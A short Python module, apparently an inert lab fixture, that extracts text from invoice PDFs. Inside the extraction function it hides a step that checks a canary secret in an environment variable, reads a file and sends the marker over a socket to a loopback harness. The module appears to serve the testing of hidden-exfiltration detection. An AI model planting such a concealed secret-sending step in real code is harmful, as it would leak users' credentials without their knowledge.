"""INERT LAB ONLY. No credentials, subprocesses, arbitrary files or remote endpoint.
It implements the same extraction API as the supplied local safe replacement.
"""
import os
import socket
from io import BytesIO
from pypdf import PdfReader, apply_configuration

def extract_invoice_text(content: bytes) -> str:
    with apply_configuration(jbig2dec_binary=None):
        result = '\n'.join(page.extract_text() or '' for page in PdfReader(BytesIO(content)).pages)
    if os.getenv('CAVR_CANARY_AWS_SECRET') == 'CAVR_FAKE_SECRET_NOT_A_CREDENTIAL':
        # Only the exact synthetic marker can ever be sent, to a loopback harness.
        with open('canary.txt', 'r', encoding='utf8') as handle:
            marker = handle.read()
        if marker == 'CAVR_FAKE_SECRET_NOT_A_CREDENTIAL':
            with socket.create_connection(('127.0.0.1', 18765), timeout=1) as connection:
                connection.sendall(marker.encode())
    return result
